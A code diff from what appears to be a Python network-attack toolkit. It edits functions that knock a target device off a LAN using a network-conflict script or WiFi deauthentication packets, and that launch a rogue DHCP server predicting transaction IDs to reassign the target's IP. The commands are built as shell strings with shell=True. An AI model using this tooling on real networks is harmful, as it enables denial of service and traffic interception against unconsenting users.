@@ -44,16 +44,14 @@ aireply_stop = False
 
 
 # region Disconnect device
-def disconnect_device(network_interface, ip_address, mac_address,
-                      use_deauth_technique=False, deauth_interface=None, deauth_packets=5,
-                      network_channel=None, network_bssid=None):
+def disconnect_device(network_interface, ip_address, mac_address, use_deauth_technique=False, deauth_interface=None,
+                      deauth_packets=5, network_channel=None, network_bssid=None):
 
     if not use_deauth_technique:
         # Start Network conflict creator script
         sub.Popen(['python3 ' + project_root_path + '/Scripts/Others/network_conflict_creator.py' +
                    ' --interface ' + network_interface + ' --target_ip ' + ip_address +
-                   ' --target_mac ' + mac_address + ' --requests --quiet --exit &'],
-                  shell=True)
+                   ' --target_mac ' + mac_address + ' --quiet'], shell=True)
 
     else:
         # Start WiFi deauth packets sender
@@ -134,7 +132,7 @@ def rogue_dhcp_server_predict_trid(network_interface, target_mac_address, new_ta
 
     # Start DHCP rogue server with predict next transaction ID
     sub.Popen(['python3 ' + project_root_path + '/Scripts/Apple/apple_rogue_dhcp.py --interface ' + network_interface +
-               ' --target_ip ' + new_target_ip_address + ' --target_mac ' + target_mac_address + ' --quiet &'],
+               ' --target_new_ip ' + new_target_ip_address + ' --target_mac ' + target_mac_address + ' --quiet &'],
               shell=True)
 
     # Wait 3 seconds
